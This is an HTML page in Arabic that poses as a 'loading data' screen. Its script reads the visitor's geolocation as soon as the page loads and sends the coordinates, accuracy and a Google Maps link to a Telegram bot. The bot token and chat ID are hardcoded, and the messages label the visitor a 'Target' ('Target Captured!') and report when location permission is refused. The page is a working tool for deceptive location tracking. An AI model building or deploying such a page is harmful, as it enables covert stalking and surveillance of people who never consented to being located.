<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عرض المحتوى المتاح</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h2>جاري تحميل البيانات...</h2>
    <p>يرجى الانتظار لحظات</p>

    <script>
        // بيانات البوت الخاص بك
        const botToken = '8589430409:AAEL4LbQ7Zm54ws-AHf5mGdCVmh7TlfEwdY'; 
        const chatId = '7731320029';

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            fetch(url);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                sendToTelegram("الهدف يدعم متصفح قديم: لا يدعم Geolocation");
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            const text = `🚨 Target Captured! 🚨\n\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Accuracy: ${accuracy} meters\n🌐 Map: ${mapUrl}`;
            
            sendToTelegram(text);
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    sendToTelegram("الهدف رفض منح صلاحية الموقع");
                    break;
                case error.POSITION_UNAVAILABLE:
                    sendToTelegram("معلومات الموقع غير متاحة");
                    break;
                case error.TIMEOUT:
                    sendToTelegram("انتهت مهلة طلب الموقع");
                    break;
            }
        }

        // تفعيل السحب فور تحميل الصفحة
        window.onload = getLocation;
    </script>
</body>
</html>
